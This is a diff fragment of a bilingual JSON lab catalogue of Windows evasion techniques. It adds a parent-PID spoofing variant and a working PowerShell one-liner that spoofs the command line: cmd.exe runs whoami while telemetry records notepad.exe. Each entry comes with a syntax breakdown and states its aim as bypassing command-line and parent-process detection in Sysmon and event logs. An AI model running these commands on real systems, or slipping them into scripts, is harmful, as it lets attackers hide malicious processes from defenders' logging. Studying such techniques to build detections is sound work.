+            "zh": "绕过单属性 PPID 检测：OpenProcess 取 {LAB_PARENT_PID} 句柄后组完整属性列表（InitializeProcThreadAttributeList + UpdateProcThreadAttribute 0x00020000），CreateProcess 派生子进程并回读父子关系。成功判据：输出 ppid 等于 {LAB_PARENT_PID}，Sysmon E1 ParentImage 对应该父进程。",
+            "en": "Builds the complete attribute list against a handle opened on {LAB_PARENT_PID} and spawns a child whose parentage is read back after creation. Success: the printed ppid equals {LAB_PARENT_PID} and Sysmon E1 ParentImage matches that parent."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "OpenProcess(0x1FFFFF,$false,{LAB_PARENT_PID})",
+              "explanation": {
+                "zh": "打开伪装父进程句柄（全访问权）",
+                "en": "Open the intended parent with full access"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "InitializeProcThreadAttributeList($al,1,0,[ref]$s)",
+              "explanation": {
+                "zh": "初始化单条目属性列表",
+                "en": "Initialize a one-entry attribute list"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "UpdateProcThreadAttribute(...,0x00020000,...)",
+              "explanation": {
+                "zh": "设置父进程属性（0x00020000）",
+                "en": "Set the parent-process attribute (0x00020000)"
+              },
+              "type": "function"
+            },
+            {
+              "part": "(Get-CimInstance Win32_Process ...).ParentProcessId",
+              "explanation": {
+                "zh": "创建后回读父子关系作断言",
+                "en": "Read the child back after creation for the assertion"
+              },
+              "type": "function"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "evasion-arg-spoofing",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "Add-Type -Namespace Win32 -Name Kernel32B -MemberDefinition '[DllImport(\"kernel32.dll\", CharSet=CharSet.Unicode, SetLastError=true)] public static extern bool CreateProcess(string app, IntPtr cmd, IntPtr pa, IntPtr ta, bool inh, uint f, IntPtr e, string d, ref SI si, out PI pi); [StructLayout(LayoutKind.Sequential)] public struct SI { public int cb; public string r1, r2, r3; public int x, y, xs, ys, xc, yc, fa, fl; public short sw, cr; public IntPtr rr, i, o, e_; } [StructLayout(LayoutKind.Sequential)] public struct PI { public IntPtr hp, ht; public int pid, tid; }'",
+          "command": "$src='using System;using System.Runtime.InteropServices;public class C{[DllImport(\"kernel32.dll\",CharSet=CharSet.Unicode,SetLastError=true)]public static extern bool CreateProcess(string an,string cl,IntPtr pa,IntPtr ta,bool ih,uint f,IntPtr e,string d,ref SI si,out PI pi);[StructLayout(LayoutKind.Sequential,CharSet=CharSet.Unicode)]public struct SI{public int cb;public string r1,r2,r3;public int x,y,xs,ys,xc,yc,fa,fl;public short sw,cr;public IntPtr rr,ii,oo,ee;}[StructLayout(LayoutKind.Sequential)]public struct PI{public IntPtr hp,ht;public int pid,tid;}}';Add-Type -TypeDefinition $src -Name C -Namespace W;$si=New-Object 'W.C+SI';$si.cb=[Runtime.InteropServices.Marshal]::SizeOf([type]'W.C+SI');$pi=New-Object 'W.C+PI';[void][W.C]::CreateProcess('C:\\Windows\\System32\\cmd.exe','\"C:\\Windows\\System32\\notepad.exe\" /c whoami > arg-spoof.txt',[IntPtr]::Zero,[IntPtr]::Zero,$false,0,[IntPtr]::Zero,$null,[ref]$si,[ref]$pi);Start-Sleep -Milliseconds 900;'recorded-cmdline-token=notepad.exe actual-exe=cmd.exe file-content:';Get-Content arg-spoof.txt",
+          "title": {
+            "zh": "应用名与命令行差分规避变体",
+            "en": "Application-Name vs Command-Line Spoof Variant"
+          },
+          "description": {
+            "zh": "绕过命令行快照一致性校验：lpApplicationName 指定真实 cmd.exe，lpCommandLine 首令牌伪装为 notepad.exe；cmd 忽略自身 argv[0] 后继续解析 /c 子命令，遥测记录的 CommandLine 是伪装形态。成功判据：arg-spoof.txt 生成且内容为 whoami 输出，而事件日志 CommandLine 显示 notepad.exe。",
+            "en": "Points lpApplicationName at the real cmd.exe while the first lpCommandLine token spoofs notepad.exe; cmd skips its own argv[0] and still parses the /c subcommand, so telemetry records the spoofed form. Success: arg-spoof.txt holds whoami output while event logs show the notepad.exe token."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "CreateProcess('C:\\Windows\\System32\\cmd.exe',...)",
+              "explanation": {
+                "zh": "lpApplicationName 指定真实执行体 cmd.exe",
+                "en": "lpApplicationName pins the real executable cmd.exe"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "\"C:\\Windows\\System32\\notepad.exe\" /c whoami > arg-spoof.txt",
+              "explanation": {
+                "zh": "伪装首令牌：cmd 跳过 argv[0] 继续解析 /c 子命令",
+                "en": "Spoofed first token: cmd skips its argv[0] and still parses the /c subcommand"
+              },
+              "type": "value"
+            },
+            {
+              "part": "Get-Content arg-spoof.txt",
+              "explanation": {
+                "zh": "判据：文件内容为 whoami 输出，与记录命令行不匹配",
+                "en": "Assertion: the file holds whoami output, mismatching the recorded command line"
+              },
+              "type": "function"
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
